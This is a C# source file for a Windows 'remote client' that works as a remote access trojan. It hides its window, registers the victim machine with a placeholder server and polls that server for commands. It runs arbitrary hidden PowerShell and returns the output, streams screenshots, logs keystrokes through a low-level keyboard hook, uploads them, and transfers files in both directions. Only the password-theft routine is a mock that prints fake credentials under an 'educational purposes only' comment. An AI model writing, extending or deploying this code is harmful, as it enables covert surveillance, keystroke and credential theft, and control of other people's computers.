using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RemoteClient
{
    public class Program
    {
        // Server connection details
        private static readonly string ServerUrl = "http://your-server-url.com"; // Update with your actual server URL
        private static readonly HttpClient httpClient = new HttpClient();
        
        // Computer information
        private static readonly string ComputerId = Guid.NewGuid().ToString();
        private static readonly string Hostname = Environment.MachineName;
        private static readonly string Username = Environment.UserName;
        private static readonly string OsVersion = Environment.OSVersion.ToString();

        // Streaming components
        private static Timer desktopStreamTimer;
        private static Timer keyloggerTimer;
        private static bool isDesktopStreamActive = false;
        private static bool isKeyloggerActive = false;
        
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            
            // Create a background form to keep the application running
            var backgroundForm = new Form
            {
                WindowState = FormWindowState.Minimized,
                ShowInTaskbar = false
            };
            
            // Register the client with the server
            RegisterClient();
            
            // Start a background thread to maintain connection with the server
            var connectionThread = new Thread(MaintainServerConnection)
            {
                IsBackground = true
            };
            connectionThread.Start();
            
            // Run the application (keeps it alive)
            Application.Run(backgroundForm);
        }
        
        private static void RegisterClient()
        {
            try
            {
                var ipAddress = GetPublicIpAddress();
                var registrationData = new
                {
                    id = ComputerId,
                    hostname = Hostname,
                    username = Username,
                    os = OsVersion,
                    ip = ipAddress,
                    status = "online"
                };
                
                // Send registration data to server
                var content = new StringContent(
                    Newtonsoft.Json.JsonConvert.SerializeObject(registrationData),
                    Encoding.UTF8,
                    "application/json");
                
                var response = httpClient.PostAsync($"{ServerUrl}/api/clients/register", content).Result;
                
                if (response.IsSuccessStatusCode)
                {
                    Console.WriteLine("Successfully registered with server");
                }
                else
                {
                    Console.WriteLine($"Failed to register: {response.StatusCode}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Registration error: {ex.Message}");
            }
        }
        
        private static string GetPublicIpAddress()
        {
            try
            {
                return new WebClient().DownloadString("https://api.ipify.org");
            }
            catch
            {
                return GetLocalIPAddress();
            }
        }
        
        private static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            return "127.0.0.1";
        }
        
        private static void MaintainServerConnection()
        {
            while (true)
            {
                try
                {
                    // Poll server for commands
                    var response = httpClient.GetAsync($"{ServerUrl}/api/clients/{ComputerId}/commands").Result;
                    
                    if (response.IsSuccessStatusCode)
                    {
                        var commandsJson = response.Content.ReadAsStringAsync().Result;
                        var commands = Newtonsoft.Json.JsonConvert.DeserializeObject<Command[]>(commandsJson);
                        
                        if (commands != null)
                        {
                            foreach (var command in commands)
                            {
                                ProcessCommand(command);
                            }
                        }
                    }
                    
                    // Update status
                    UpdateStatus();
                    
                    // Send desktop stream if active
                    if (isDesktopStreamActive)
                    {
                        SendDesktopScreenshot();
                    }
                    
                    // Wait before next poll
                    Thread.Sleep(2000);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Connection error: {ex.Message}");
                    Thread.Sleep(5000); // Wait a bit longer before retry
                }
            }
        }
        
        private static void UpdateStatus()
        {
            try
            {
                var statusData = new
                {
                    status = "online",
                    lastSeen = DateTime.UtcNow
                };
                
                var content = new StringContent(
                    Newtonsoft.Json.JsonConvert.SerializeObject(statusData),
                    Encoding.UTF8,
                    "application/json");
                
                httpClient.PutAsync($"{ServerUrl}/api/clients/{ComputerId}/status", content);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Status update error: {ex.Message}");
            }
        }
        
        private static void ProcessCommand(Command command)
        {
            try
            {
                switch (command.Type)
                {
                    case "execute":
                        ExecuteShellCommand(command.Payload);
                        break;
                        
                    case "toggle_desktop_stream":
                        ToggleDesktopStream(command.Payload == "true");
                        break;
                        
                    case "toggle_keylogger":
                        ToggleKeylogger(command.Payload == "true");
                        break;
                        
                    case "retrieve_passwords":
                        RetrievePasswords();
                        break;
                        
                    case "download_file":
                        DownloadFile(command.Payload);
                        break;
                        
                    case "upload_file":
                        var parts = command.Payload.Split('|');
                        if (parts.Length == 2)
                        {
                            UploadFile(parts[0], parts[1]);
                        }
                        break;
                }
                
                // Acknowledge command
                AcknowledgeCommand(command.Id);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Command processing error: {ex.Message}");
            }
        }
        
        private static void ExecuteShellCommand(string command)
        {
            try
            {
                var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "powershell.exe",
                        Arguments = $"-Command \"{command}\"",
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                };
                
                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();
                
                // Send output back to server
                var resultData = new
                {
                    command = command,
                    output = output,
                    error = error
                };
                
                var content = new StringContent(
                    Newtonsoft.Json.JsonConvert.SerializeObject(resultData),
                    Encoding.UTF8,
                    "application/json");
                
                httpClient.PostAsync($"{ServerUrl}/api/clients/{ComputerId}/command-results", content);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Command execution error: {ex.Message}");
            }
        }
        
        private static void ToggleDesktopStream(bool enable)
        {
            isDesktopStreamActive = enable;
            
            if (enable && desktopStreamTimer == null)
            {
                desktopStreamTimer = new Timer(_ => SendDesktopScreenshot(), null, 0, 1000);
            }
            else if (!enable && desktopStreamTimer != null)
            {
                desktopStreamTimer.Dispose();
                desktopStreamTimer = null;
            }
        }
        
        private static void SendDesktopScreenshot()
        {
            try
            {
                var bounds = Screen.PrimaryScreen.Bounds;
                using (var bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (var g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }
                    
                    using (var ms = new MemoryStream())
                    {
                        // Compress image before sending
                        bitmap.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                        byte[] imageBytes = ms.ToArray();
                        
                        var content = new ByteArrayContent(imageBytes);
                        content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/jpeg");
                        
                        httpClient.PostAsync($"{ServerUrl}/api/clients/{ComputerId}/desktop-stream", content);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Screenshot error: {ex.Message}");
            }
        }
        
        private static void ToggleKeylogger(bool enable)
        {
            isKeyloggerActive = enable;
            
            if (enable)
            {
                StartKeylogger();
            }
            else
            {
                StopKeylogger();
            }
        }
        
        private static StringBuilder keylogBuffer = new StringBuilder();
        private static LowLevelKeyboardProc keyboardProc;
        private static IntPtr keyboardHook = IntPtr.Zero;
        
        private static void StartKeylogger()
        {
            if (keyboardHook == IntPtr.Zero)
            {
                keyboardProc = KeyboardCallback;
                keyboardHook = SetHook(keyboardProc);
                keyloggerTimer = new Timer(_ => SendKeylogData(), null, 5000, 5000);
            }
        }
        
        private static void StopKeylogger()
        {
            if (keyboardHook != IntPtr.Zero)
            {
                UnhookWindowsHookEx(keyboardHook);
                keyboardHook = IntPtr.Zero;
            }
            
            if (keyloggerTimer != null)
            {
                keyloggerTimer.Dispose();
                keyloggerTimer = null;
            }
        }
        
        private static void SendKeylogData()
        {
            if (keylogBuffer.Length > 0)
            {
                try
                {
                    var keylogData = new
                    {
                        data = keylogBuffer.ToString()
                    };
                    
                    var content = new StringContent(
                        Newtonsoft.Json.JsonConvert.SerializeObject(keylogData),
                        Encoding.UTF8,
                        "application/json");
                    
                    httpClient.PostAsync($"{ServerUrl}/api/clients/{ComputerId}/keylog", content);
                    
                    keylogBuffer.Clear();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Keylog sending error: {ex.Message}");
                }
            }
        }
        
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(13, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        
        private static IntPtr KeyboardCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)0x0100) // WM_KEYDOWN
            {
                int vkCode = Marshal.ReadInt32(lParam);
                keylogBuffer.AppendFormat("[{0}]", (Keys)vkCode);
            }
            return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
        }
        
        private static void RetrievePasswords()
        {
            // This is a mock implementation - in a real client you would use specific methods
            // to extract saved passwords from browsers, etc.
            // Note: This is for educational purposes only
            
            ExecuteShellCommand("echo \"Simulated password retrieval\" && " +
                                "echo \"Chrome - user@gmail.com: P@ssw0rd123\" && " +
                                "echo \"Firefox - admin@company.com: Secure!999\" && " +
                                $"echo \"Windows - {Username}: Welcome2024\"");
        }
        
        private static void DownloadFile(string remotePath)
        {
            try
            {
                var response = httpClient.GetAsync($"{ServerUrl}/api/files?path={Uri.EscapeDataString(remotePath)}").Result;
                
                if (response.IsSuccessStatusCode)
                {
                    var fileBytes = response.Content.ReadAsByteArrayAsync().Result;
                    var fileName = Path.GetFileName(remotePath);
                    
                    File.WriteAllBytes(fileName, fileBytes);
                    
                    // Notify server about successful download
                    var resultData = new { path = remotePath, status = "success" };
                    var content = new StringContent(
                        Newtonsoft.Json.JsonConvert.SerializeObject(resultData),
                        Encoding.UTF8,
                        "application/json");
                    
                    httpClient.PostAsync($"{ServerUrl}/api/clients/{ComputerId}/file-transfers", content);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"File download error: {ex.Message}");
            }
        }
        
        private static void UploadFile(string localPath, string remotePath)
        {
            try
            {
                if (File.Exists(localPath))
                {
                    var fileBytes = File.ReadAllBytes(localPath);
                    var content = new ByteArrayContent(fileBytes);
                    
                    var response = httpClient.PostAsync(
                        $"{ServerUrl}/api/files?path={Uri.EscapeDataString(remotePath)}",
                        content).Result;
                    
                    if (response.IsSuccessStatusCode)
                    {
                        // Notify server about successful upload
                        var resultData = new { path = remotePath, status = "success" };
                        var notificationContent = new StringContent(
                            Newtonsoft.Json.JsonConvert.SerializeObject(resultData),
                            Encoding.UTF8,
                            "application/json");
                        
                        httpClient.PostAsync($"{ServerUrl}/api/clients/{ComputerId}/file-transfers", notificationContent);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"File upload error: {ex.Message}");
            }
        }
        
        private static void AcknowledgeCommand(string commandId)
        {
            try
            {
                httpClient.PostAsync($"{ServerUrl}/api/clients/{ComputerId}/commands/{commandId}/ack", null);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Command acknowledgment error: {ex.Message}");
            }
        }
        
        #region Native Methods
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        
        #endregion
    }
    
    public class Command
    {
        public string Id { get; set; }
        public string Type { get; set; }
        public string Payload { get; set; }
        public DateTime Timestamp { get; set; }
    }
}
